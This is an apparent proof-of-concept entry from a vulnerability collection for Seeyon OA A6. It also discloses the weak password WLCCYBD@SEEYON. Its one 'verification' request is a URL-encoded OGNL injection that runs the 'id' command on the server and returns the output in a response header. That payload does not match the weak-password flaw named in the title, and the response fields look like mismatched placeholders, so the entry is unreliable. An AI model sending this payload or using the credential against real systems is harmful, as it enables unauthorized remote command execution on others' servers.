﻿# 致远 OA A6 授权访问 弱口令WLCCYBD@SEEYON

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：致远OA A6老版本下的未授权访问＋弱口令：WLCCYBD@SEEYON

> 漏洞特征：

> 验证脚本：HTTP

```
GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
```

> 响应代码特征：-1

> 响应内容特征：Sign

> 上传文件定位：

> 验证文件来源：致远 OA A6 授权访问 弱口令WLCCYBD@SEEYON.poc
